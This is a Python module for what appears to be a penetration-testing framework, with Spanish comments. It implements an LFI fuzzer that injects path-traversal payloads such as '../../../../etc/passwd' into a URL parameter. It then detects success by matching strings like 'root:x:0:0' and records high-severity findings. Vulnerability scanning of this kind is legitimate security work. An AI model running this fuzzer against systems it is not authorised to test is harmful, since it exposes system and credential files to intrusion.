import requests
import os
from core.mcp_protocol import MCPTool


class LFIScanner(MCPTool):
    def __init__(self, project_id, guardian):
        super().__init__(
            name="LFI Fuzzer",
            description="Detección de Local File Inclusion usando diccionarios",
            mitre_id="T1190",
            project_id=project_id,
            guardian=guardian,
        )
        # Conectamos con tu archivo real
        self.wordlist_path = os.path.join("data", "wordlists", "pathtraversal.txt")

    def _load_payloads(self):
        if not os.path.exists(self.wordlist_path):
            print(
                f"    ⚠️ Diccionario no encontrado: {self.wordlist_path}. Usando default."
            )
            return ["../../../../etc/passwd", "../windows/win.ini"]

        try:
            with open(self.wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return ["../../../../etc/passwd"]

    def _execute(self, target_url, parameter="page"):
        payloads = self._load_payloads()
        print(f"[*] 🌪️ Iniciando LFI Fuzzing en {target_url}")
        print(f"    📚 Diccionario: pathtraversal.txt ({len(payloads)} payloads)")

        vulns = []
        tested_count = 0

        # Firmas de éxito (Lo que buscamos en la respuesta)
        signatures = [
            "root:x:0:0",
            "[extensions]",
            "for 16-bit app support",
            "boot loader",
        ]

        for payload in payloads:
            # --- FRENO DE MANO (MODO DEV) ---
            # Quita este IF si quieres correr las 5000 líneas del diccionario
            if tested_count >= 20:
                print("    ⚠️ [DEV] Límite de 20 pruebas alcanzado. Deteniendo.")
                break
            # --------------------------------

            tested_count += 1

            # Construir URL atacante
            separator = "&" if "?" in target_url else "?"
            attack_url = f"{target_url}{separator}{parameter}={payload}"

            try:
                res = requests.get(attack_url, timeout=3)

                # Buscar firmas
                for sig in signatures:
                    if sig in res.text:
                        print(f"    🔥 VULNERABLE! Payload: {payload}")
                        self.save_finding(
                            title=f"LFI Detected in '{parameter}'",
                            target=target_url,
                            evidence=f"Payload: {payload}\nSignature found: {sig}",
                            severity="High",
                            cvss_score=8.0,
                        )
                        vulns.append(payload)
                        break  # Ya encontramos una firma, siguiente payload

            except requests.RequestException:
                pass

        return {
            "status": "FINISHED",
            "payloads_tested": tested_count,
            "vulns_found": len(vulns),
        }
